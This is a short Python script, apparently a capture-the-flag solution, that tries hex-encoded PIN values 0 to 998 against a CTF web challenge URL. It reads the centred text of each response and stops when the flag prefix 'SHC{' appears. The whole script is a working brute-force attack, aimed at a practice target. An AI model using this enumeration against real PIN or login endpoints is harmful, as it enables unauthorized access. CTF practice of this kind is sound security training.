from urllib.request import urlopen
import re

def progress(count, total):
    return (count/total)*100

for x in range(0, 999):
    url = "https://ctf.sucurihc.org/flag/eua/web50/?pin="+str(hex(x)[2:])

    print("[DEBUG] >>> Opening URL {}".format(url))
    print("{0:.2f}%".format(progress(x, 999)))
    conteudo = urlopen(url).read().decode('utf-8')
    #print(conteudo)
    
    result = re.findall("<center>(.*?)</center>", conteudo)[0]
    print(result)

    if 'SHC{' in result:
        break

